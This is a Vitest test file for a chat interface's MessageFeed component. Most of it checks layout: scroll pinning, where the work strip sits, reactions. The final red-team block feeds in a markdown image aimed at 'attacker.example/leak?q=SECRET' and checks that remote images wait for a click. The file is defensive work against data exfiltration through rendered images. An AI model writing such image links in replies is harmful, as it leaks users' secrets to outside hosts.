import { readFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { describe, expect, it } from 'vitest'

const src = readFileSync(
  join(dirname(fileURLToPath(import.meta.url)), 'MessageFeed.tsx'),
  'utf8',
)

describe('MessageFeed live chrome order', () => {
  it('re-pins the feed on composer submit, not only Jump to latest', () => {
    expect(src).toContain("reattachKey: `${lastUserMsgId ?? ''}:${stickNonce}`")
    // Session switches floor via the scroller mount, not the reattach key.
    expect(src).not.toMatch(/reattachKey:.*sessionId/)
  })

  it('routes the live turn through LiveTurnView: Working strip plus a separate reply bubble', () => {
    const dock = src.indexOf('className="live-stream-dock"')
    const view = src.indexOf('<LiveTurnView', dock)
    const reply = src.indexOf('renderReply={renderLiveReply}', view)
    const liveTodos = src.indexOf('<BuildTodos items={buildTodos} live', view)
    expect(dock).toBeGreaterThan(-1)
    expect(view).toBeGreaterThan(dock)
    expect(reply).toBeGreaterThan(view)
    expect(liveTodos).toBeGreaterThan(reply)
    // Thinking goes to the Working strip, never into the reply bubble.
    const render = src.slice(src.indexOf('const renderLiveReply'), src.indexOf('const renderLiveReply') + 400)
    expect(render).toContain('partialThinking=""')
  })

  it('keeps leftover todos after the live reply dock', () => {
    const dock = src.indexOf('className="live-stream-dock"')
    const leftover = src.indexOf('{!streaming && todosHaveOpen(buildTodos) && (')
    expect(leftover).toBeGreaterThan(dock)
  })

  it('puts the saved Working strip above the assistant bubble, not under it', () => {
    const strip = src.indexOf('steps={histSteps}')
    const bubble = src.indexOf('{showBubble && (')
    expect(strip).toBeGreaterThan(-1)
    expect(bubble).toBeGreaterThan(strip)
    expect(src).not.toContain('process-under-answer')
  })

  it('wires the feed scroll controller: End key, anchored toggles', () => {
    expect(src).toContain('endKeyJumps: true')
    expect(src).toContain('<FeedScrollContext.Provider value={anchorToggle}>')
  })
})

describe('saved assistant turn layout', () => {
  it('keeps narration out of the bubble and shows the strip above it', async () => {
    const { createElement } = await import('react')
    const { renderToStaticMarkup } = await import('react-dom/server')
    const { MessageFeed } = await import('./MessageFeed')
    const msg = {
      id: 'a1',
      role: 'assistant' as const,
      content: "I'll reach the folder through the shell.\n\nThe addon loads again.",
      thinking: 'Rename confirmed.',
      tool_calls: [{ name: 'bash', args: { command: 'dir' }, id: 'c1', narration: "I'll reach the folder through the shell." }],
      tool_results: [{ name: 'bash', output: 'ok', id: 'c1' }],
      model: null,
      agent: null,
      tokens: null,
      created_at: '2026-11-14T21:00:00Z',
      reverted: false,
    }
    const html = renderToStaticMarkup(
      createElement(MessageFeed, { messages: [msg], partialText: '', streaming: false, loading: false } as never),
    )
    const strip = html.indexOf('data-testid="work-strip"')
    const bubble = html.indexOf('chat-bubble-assistant')
    expect(strip).toBeGreaterThan(-1)
    expect(bubble).toBeGreaterThan(strip)
    const body = html.slice(bubble)
    expect(body).toContain('The addon loads again.')
    expect(body).not.toContain('reach the folder')
    expect(body).not.toContain('Rename confirmed.')
  }, 30_000) // cold import of the feed (markdown, highlighting) can pass 5 s on a loaded machine

  it('a tools-only turn shows the strip and no placeholder bubble', async () => {
    const { createElement } = await import('react')
    const { renderToStaticMarkup } = await import('react-dom/server')
    const { MessageFeed } = await import('./MessageFeed')
    const msg = {
      id: 'a2',
      role: 'assistant' as const,
      content: '*(Used tools — see process.)*',
      thinking: null,
      tool_calls: [{ name: 'bash', args: {}, id: 'c1' }],
      tool_results: [],
      model: null,
      agent: null,
      tokens: null,
      created_at: '2026-11-14T21:00:00Z',
      reverted: false,
    }
    const html = renderToStaticMarkup(
      createElement(MessageFeed, { messages: [msg], partialText: '', streaming: false, loading: false } as never),
    )
    expect(html).toContain('data-testid="work-strip"')
    expect(html).not.toContain('chat-bubble-assistant')
  })
})

describe('MessageFeed reactions', () => {
  it('only offers the picker on settled assistant replies and shows pills under the bubble', () => {
    expect(src).toContain("const canReact = Boolean(onReact) && msg.role === 'assistant' && !isStreamingPartial")
    const pills = src.indexOf('<ReactionPills')
    const bubble = src.indexOf('{showBubble && (')
    expect(pills).toBeGreaterThan(bubble)
  })

  it('opens the picker on a touch long-press', () => {
    expect(src).toContain("if (e.pointerType !== 'touch') return")
    expect(src).toContain('setPickerOpen(true), 450')
  })
})

describe('remote images in replies wait for a click (red-team)', () => {
  const base = {
    thinking: null, tool_calls: [], tool_results: [], model: null, agent: null, tokens: null,
    created_at: '2026-11-15T06:00:00Z', reverted: false,
  }
  it('does not paint an internet image in an assistant reply', async () => {
    const { createElement } = await import('react')
    const { renderToStaticMarkup } = await import('react-dom/server')
    const { MessageFeed } = await import('./MessageFeed')
    const msg = { ...base, id: 'r1', role: 'assistant' as const, content: 'Done ![chart](https://attacker.example/leak?q=SECRET)' }
    const html = renderToStaticMarkup(
      createElement(MessageFeed, { messages: [msg], partialText: '', streaming: false, loading: false } as never),
    )
    expect(html).toContain('data-testid="remote-image-gate"')
    expect(html).toContain('attacker.example')
    expect(html).not.toMatch(/<img[^>]+attacker\.example/)
  })
  it('still paints inline data images', async () => {
    const { createElement } = await import('react')
    const { renderToStaticMarkup } = await import('react-dom/server')
    const { MessageFeed } = await import('./MessageFeed')
    const msg = { ...base, id: 'r2', role: 'assistant' as const, content: 'Here ![dot](data:image/png;base64,iVBORw0KGgo=)' }
    const html = renderToStaticMarkup(
      createElement(MessageFeed, { messages: [msg], partialText: '', streaming: false, loading: false } as never),
    )
    expect(html).not.toContain('remote-image-gate')
  })
})
